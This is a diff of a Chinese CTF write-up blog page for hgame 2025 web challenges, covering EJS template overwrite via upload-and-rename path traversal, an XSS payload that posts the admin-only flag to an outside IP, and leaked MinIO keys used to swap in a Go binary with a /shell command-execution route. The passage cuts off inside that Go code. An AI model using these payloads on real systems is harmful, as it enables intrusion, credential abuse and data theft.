+<h1 id="Level-47-BandBomb"><a href="#Level-47-BandBomb" class="headerlink" title="Level 47 BandBomb"></a>Level 47 BandBomb</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
 <p>首先看到<code>const multer = require(&#39;multer&#39;)</code>使用了multer然后有任意文件上传，并且rename路由可以重命名上传的文件，</p>
 <blockquote>
 <p>Express会通过view&#x2F;mortis.ejs渲染mortis视图</p>
 </blockquote>
 <p>那么就可以上传一个ejs文件重命名为..&#x2F;view&#x2F;mortis.ejs</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= process.env.FLAG || require(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= process.env.FLAG || require(&#x27;fs&#x27;).readFileSync(&#x27;/flag&#x27;) %&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101332143.png" alt="image-20250210133220036"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101332143.png" alt="image-20250210133220036"></p>
 <p>再访问主页面</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101331952.png" alt="image-20250210133122592"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101331952.png" alt="image-20250210133122592"></p>
 <p>hgame{aVe_MuJ1cA-Has-BROK3n_UP-But-w3_h@v3-uMlTakif}</p>
 <h1 id="Level-69-MysteryMessageBoard"><a href="#Level-69-MysteryMessageBoard" class="headerlink" title="Level 69 MysteryMessageBoard"></a>Level 69 MysteryMessageBoard</h1><p>弱口令，密码是888888</p>
 <p>进去之后有个留言板</p>
-<img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330017.png" alt="image-20250204225011231" style="zoom:50%;">
+<img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330017.png" alt="image-20250204225011231" style="zoom:50%;">
 
 <p>存在xss并且flag路由只能admin访问,admin路由可以查看留言</p>
 <p>那么让admin访问flag就行，把数据外带出来</p>
-<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> flagData = xmlhttp.<span class="property">responseText</span>;</span><br><span class="line">        <span class="keyword">var</span> flag1 = <span class="title function_">btoa</span>(flagData);</span><br><span class="line">        <span class="keyword">var</span> remoteServerUrl = <span class="string">&#x27;http://60.205.1.86:9000/&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> xmlhttp2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xmlhttp2.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, remoteServerUrl, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp2.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xmlhttp2.<span class="title function_">send</span>(<span class="string">&quot;content=&quot;</span> + <span class="built_in">encodeURIComponent</span>(flag1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xmlhttp.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xmlhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlhttp.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> flagData = xmlhttp.<span class="property">responseText</span>;</span><br><span class="line">        <span class="keyword">var</span> flag1 = <span class="title function_">btoa</span>(flagData);</span><br><span class="line">        <span class="keyword">var</span> remoteServerUrl = <span class="string">&#x27;http://60.205.1.86:9000/&#x27;</span>;</span><br><span class="line">        <span class="keyword">var</span> xmlhttp2 = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xmlhttp2.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, remoteServerUrl, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp2.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xmlhttp2.<span class="title function_">send</span>(<span class="string">&quot;content=&quot;</span> + <span class="built_in">encodeURIComponent</span>(flag1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/flag&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330123.png" alt="image-20250206214131540"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330123.png" alt="image-20250206214131540"></p>
 <p>hgame{W0w_y0u_5r4_9o0d_4t_xss}</p>
 <h1 id="Level-25-双面人派对"><a href="#Level-25-双面人派对" class="headerlink" title="Level 25 双面人派对"></a>Level 25 双面人派对</h1><p>main文件直接执行，可以看到是启了一个http服务</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330228.png" alt="image-20250209120914776"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330228.png" alt="image-20250209120914776"></p>
 <p>然后先对main文件upx -d脱壳，再用ida打开</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330161.png" alt="image-20250209191807064"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101333759.png" alt="image-20250210133305397"></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">minio:</span><br><span class="line">  endpoint: &quot;127.0.0.1:9000&quot;</span><br><span class="line">  access_key: &quot;minio_admin&quot;</span><br><span class="line">  secret_key: &quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span><br><span class="line">  bucket: &quot;prodbucket&quot;</span><br><span class="line">  key: &quot;update&quot;</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330161.png" alt="image-20250209191807064"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101333759.png" alt="image-20250210133305397"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">minio:</span><br><span class="line">  endpoint: &quot;127.0.0.1:9000&quot;</span><br><span class="line">  access_key: &quot;minio_admin&quot;</span><br><span class="line">  secret_key: &quot;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=&quot;</span><br><span class="line">  bucket: &quot;prodbucket&quot;</span><br><span class="line">  key: &quot;update&quot;</span><br></pre></td></tr></table></figure>
 
 <p>问gpt，这是MinIO对象存储服务</p>
-<img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330170.png" alt="image-20250209130016207" style="zoom:50%;">
+<img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330170.png" alt="image-20250209130016207" style="zoom:50%;">
 
 <p>连接服务</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mc alias set test http://node1.hgame.vidar.club:30574/ minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mc alias set test http://node1.hgame.vidar.club:30574/ minio_admin JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=</span><br></pre></td></tr></table></figure>
 
-<p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330221.png" alt="image-20250209134636965"></p>
+<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330221.png" alt="image-20250209134636965"></p>
 <p>源码在<code>hints</code>里，并且发现prodbucket里面有个<code>update</code></p>
-<p>结合文章<a class="link" target="_blank" rel="noopener" href="https://baimeow.cn/posts/ctf/d3go">https://baimeow.cn/posts/ctf/d3go <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330114.png" alt="image-20250209134838177" style="zoom:50%;">
+<p>结合文章<a target="_blank" rel="noopener" href="https://baimeow.cn/posts/ctf/d3go">https://baimeow.cn/posts/ctf/d3go</a></p>
+<img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330114.png" alt="image-20250209134838177" style="zoom:50%;">
 
 <p>直接在main.go里面增加一个rce路由编译成<code>update</code>,再上传到prodbucket覆盖原来的<code>update</code>就行</p>
-<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">	<span class="string">&quot;src/conf&quot;</span></span><br><span class="line">	<span class="string">&quot;src/fetch&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fetcher := &amp;fetch.MinioFetcher&#123;</span><br><span class="line">		Bucket:    conf.MinioBucket,</span><br><span class="line">		Key:       conf.MinioKey,</span><br><span class="line">		Endpoint:  conf.MinioEndpoint,</span><br><span class="line">		AccessKey: conf.MinioAccessKey,</span><br><span class="line">		SecretKey: conf.MinioSecretKey,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	overseer.Run(overseer.Config&#123;</span><br><span class="line">		Program: program,</span><br><span class="line">		Fetcher: fetcher,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">program</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">	g := gin.Default()</span><br><span class="line">	g.StaticFS(<span class="string">&quot;/&quot;</span>, gin.Dir(<span class="string">&quot;.&quot;</span>, <span class="literal">true</span>))</span><br><span class="line"></span><br><span class="line">	g.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		cmd := c.PostForm(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> cmd == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			c.String(<span class="number">400</span>, <span class="string">&quot;No command provided&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd).CombinedOutput()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.String(<span class="number">500</span>, <span class="string">&quot;Error executing command: %v&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	err := g.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Failed to start server:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">	<span class="string">&quot;src/conf&quot;</span></span><br><span class="line">	<span class="string">&quot;src/fetch&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fetcher := &amp;fetch.MinioFetcher&#123;</span><br><span class="line">		Bucket:    conf.MinioBucket,</span><br><span class="line">		Key:       conf.MinioKey,</span><br><span class="line">		Endpoint:  conf.MinioEndpoint,</span><br><span class="line">		AccessKey: conf.MinioAccessKey,</span><br><span class="line">		SecretKey: conf.MinioSecretKey,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	overseer.Run(overseer.Config&#123;</span><br><span class="line">		Program: program,</span><br><span class="line">		Fetcher: fetcher,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">program</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">	g := gin.Default()</span><br><span class="line">	g.StaticFS(<span class="string">&quot;/&quot;</span>, gin.Dir(<span class="string">&quot;.&quot;</span>, <span class="literal">true</span>))</span><br><span class="line"></span><br><span class="line">	g.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		cmd := c.PostForm(<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> cmd == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			c.String(<span class="number">400</span>, <span class="string">&quot;No command provided&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd).CombinedOutput()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			c.String(<span class="number">500</span>, <span class="string">&quot;Error executing command: %v&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">	